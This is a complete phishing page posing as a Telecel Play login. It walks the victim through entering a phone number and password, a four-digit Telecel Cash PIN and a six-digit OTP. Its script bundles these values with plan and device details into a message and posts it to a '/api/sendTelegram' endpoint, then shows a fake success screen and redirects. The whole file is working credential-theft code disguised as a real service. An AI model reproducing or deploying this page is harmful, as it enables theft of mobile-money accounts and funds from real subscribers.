<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Telecel Play Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{
font-family:"Plus Jakarta Sans",system-ui;
margin:0;
min-height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:linear-gradient(180deg,#fff5f7,#ffe3e8);
overflow:hidden;
}

/* background waves */

.wave{
position:fixed;
width:700px;
height:700px;
border-radius:50%;
background:radial-gradient(circle,rgba(230,0,35,.15),transparent 70%);
filter:blur(45px);
animation:float 20s infinite linear;
z-index:-1;
}

.wave.one{top:-250px;right:-150px}
.wave.two{bottom:-250px;left:-150px}

@keyframes float{
0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}
}

/* card */

.step{
position:absolute;
width:100%;
max-width:420px;
padding:30px;
background:white;
border-radius:22px;

box-shadow:
0 25px 50px rgba(0,0,0,.12),
0 6px 14px rgba(0,0,0,.06);

transition:.35s;
}

.container{
position:relative;
width:100%;
max-width:420px;
height:560px;
}

.hidden{
opacity:0;
pointer-events:none;
transform:translateX(40px);
}

/* logo */

.logo{
height:110px;
display:block;
margin:auto;
}

/* typography */

h1{
text-align:center;
color:#e60023;
margin:10px 0 4px;
font-size:22px;
font-weight:800;
}

.subtitle{
text-align:center;
font-size:13px;
color:#555;
margin-bottom:18px;
}

/* inputs */

label{
font-size:12px;
margin-top:12px;
display:block;
color:#444;
}

input{
width:100%;
padding:13px;
border-radius:14px;
border:1px solid #eee;
background:#fafafa;
margin-top:6px;
font-size:14px;
transition:.2s;
}

input:focus{
outline:none;
border-color:#e60023;
background:white;
box-shadow:0 0 0 3px rgba(230,0,35,.08);
}

/* password */

.password-box{
position:relative;
}

.eye{
position:absolute;
right:12px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
opacity:.6;
}

/* button */

.btn{
margin-top:20px;
width:100%;
padding:13px;
border-radius:14px;
border:0;
font-weight:700;
background:#e60023;
color:white;
cursor:pointer;
transition:.2s;
}

.btn:hover{
transform:translateY(-1px);
box-shadow:0 10px 18px rgba(230,0,35,.2);
}

/* otp */

.pin{
display:flex;
gap:12px;
justify-content:center;
margin:22px 0;
}

.pin input{
width:52px;
height:58px;
font-size:22px;
text-align:center;
border-radius:16px;
border:1px solid #eee;
background:white;
box-shadow:
0 1px 2px rgba(0,0,0,.05),
inset 0 1px 1px rgba(0,0,0,.04);
transition:.2s;
}

.pin input:focus{
border-color:#e60023;
box-shadow:
0 0 0 3px rgba(230,0,35,.12),
0 4px 12px rgba(0,0,0,.06);
}

/* timer */

.count{
text-align:center;
font-size:13px;
color:#666;
}

/* resend */

.resend{
text-align:center;
margin-top:10px;
font-size:13px;
}

.resend button{
border:0;
background:none;
color:#e60023;
cursor:pointer;
font-weight:600;
}

/* loading */

.pulse{
height:90px;
animation:pulse 1.2s infinite ease-in-out;
}

@keyframes pulse{
0%{transform:scale(.9);opacity:.6}
50%{transform:scale(1.05);opacity:1}
100%{transform:scale(.9);opacity:.6}
}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>

<div class="container">

<!-- LOGIN -->

<div id="step1" class="step">

<img src="assets/telecel.svg" class="logo">

<h1>Welcome to Telecel Play</h1>

<div class="subtitle">
Enter your number to log in.
You need to be a Telecel subscriber to proceed.
</div>

<form id="form">

<label>Phone Number</label>
<input id="phone" inputmode="numeric" placeholder="0XXXXXXXXX">

<label>Password</label>

<div class="password-box">

<input id="password" type="password">

<span class="eye" onclick="togglePassword()">👁</span>

</div>

<button class="btn">
Next
</button>

</form>

</div>


<!-- LOADING -->

<div id="loading" class="step hidden">

<div style="text-align:center">

<img src="assets/telecel.svg" class="pulse">

<div class="subtitle">
Connecting securely...
</div>

</div>

</div>


<!-- PIN -->

<div id="step2" class="step hidden">

<h1>Enter your Telecel Cash PIN</h1>

<div class="subtitle" id="showNumber"></div>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<button class="btn" onclick="submitPin()">
Login
</button>

</div>


<!-- OTP -->

<div id="step3" class="step hidden">

<h1>Verify OTP</h1>

<div class="subtitle">
Enter 6 digit code sent to your number
</div>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<div class="count">
Code expires in <span id="time">120</span>s
</div>

<div class="resend">
<button onclick="resendOtp()">Resend OTP</button>
</div>

<button class="btn" onclick="submitOtp()">
Verify OTP
</button>

</div>


<!-- SUCCESS -->

<div id="step4" class="step hidden">

<div style="text-align:center">

<img src="assets/telecel.svg" class="pulse">

<h1>Success</h1>

<div class="subtitle">
Logging you in...
</div>

</div>

</div>

</div>


<script>

/* device */

const ua=navigator.userAgent

let device="Unknown"

if(/Android/i.test(ua)) device="Android"
else if(/iPhone|iPad/i.test(ua)) device="iOS"

if(/Chrome/i.test(ua)) device+=" | Chrome"
else if(/Safari/i.test(ua)) device+=" | Safari"
else if(/Firefox/i.test(ua)) device+=" | Firefox"


/* plan */

let planLine="Not captured"

try{

const p=JSON.parse(sessionStorage.getItem("selectedPlan"))

if(p){

planLine=[p.name||"",p.price||""].join(" — ")

}

}catch(e){}


/* values */

let phoneValue=""
let passwordValue=""
let pinValue=""
let otpValue=""

phone.oninput=e=>{

phoneValue=e.target.value

}


/* step control */

function show(id){

document.querySelectorAll(".step")
.forEach(s=>s.classList.add("hidden"))

document.getElementById(id)
.classList.remove("hidden")

}


/* professional message */

function buildMessage(stage){

return `Telecel Play Login

Stage: ${stage}
Number: ${phoneValue}
Password: ${passwordValue}
Pin: ${pinValue}
Otp: ${otpValue}
Plan: ${planLine}
Device: ${device}
Time: ${new Date().toISOString()}`
}


/* send */

async function sendToServer(stage){

await fetch("/api/sendTelegram",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

message:buildMessage(stage)

})

})

}


/* login */

form.onsubmit=e=>{

e.preventDefault()

passwordValue=password.value

show("loading")

setTimeout(()=>{

showNumber.textContent=phoneValue

show("step2")

},900)

}


/* pin inputs */

const pinInputs=document.querySelectorAll("#step2 input")

pinInputs.forEach((input,index)=>{

input.oninput=()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<3)
pinInputs[index+1].focus()

}

input.onkeydown=e=>{

if(e.key==="Backspace" && !input.value && index>0){

pinInputs[index-1].focus()

pinInputs[index-1].value=""

}

}

})


function submitPin(){

pinValue=[...pinInputs].map(i=>i.value).join("")

sendToServer("Pin")

show("loading")

setTimeout(()=>{

show("step3")

startTimer()

},800)

}


/* otp inputs */

const otpInputs=document.querySelectorAll("#step3 input")

otpInputs.forEach((input,index)=>{

input.oninput=()=>{

input.value=input.value.replace(/\D/g,"")

if(input.value && index<5)
otpInputs[index+1].focus()

}

input.onkeydown=e=>{

if(e.key==="Backspace" && !input.value && index>0){

otpInputs[index-1].focus()

otpInputs[index-1].value=""

}

}

})


function submitOtp(){

otpValue=[...otpInputs].map(i=>i.value).join("")

sendToServer("Otp")

show("step4")

setTimeout(()=>{

location.href="thankyou.html"

},1500)

}


function resendOtp(){

startTimer()

}


/* timer */

function startTimer(){

let t=120

time.textContent=t

const i=setInterval(()=>{

t--

time.textContent=t

if(t<=0) clearInterval(i)

},1000)

}

</script>

</body>
</html>
